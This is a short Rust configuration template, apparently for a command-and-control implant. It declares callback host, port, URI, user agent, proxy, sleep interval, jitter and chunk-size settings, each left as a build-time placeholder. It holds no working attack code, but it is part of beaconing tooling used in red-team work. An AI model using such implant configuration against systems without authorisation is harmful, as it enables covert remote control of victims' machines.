use once_cell::sync::Lazy;
use std::sync::RwLock;

pub static UUID: Lazy<RwLock<String>> = Lazy::new(|| RwLock::new(String::from("%UUID%")));

pub static callback_host: &str = "%HOSTNAME%";
pub static post_uri: &str = "%ENDPOINT%";
pub static callback_port: &str = "%PORT%";
pub static user_agent: &str = "%USERAGENT%";
pub static proxy_host: &str = "%PROXYURL%";
pub static callback_interval: u64 = %SLEEPTIME%;
pub static callback_jitter: u64 = %JITTER%;
pub static chunk_size: usize = %CHUNKSIZE%;
pub static use_ssl : bool = false; // TODO: %SSL%
pub static use_proxy: bool = false; // TODO: %PROXYENABLED%

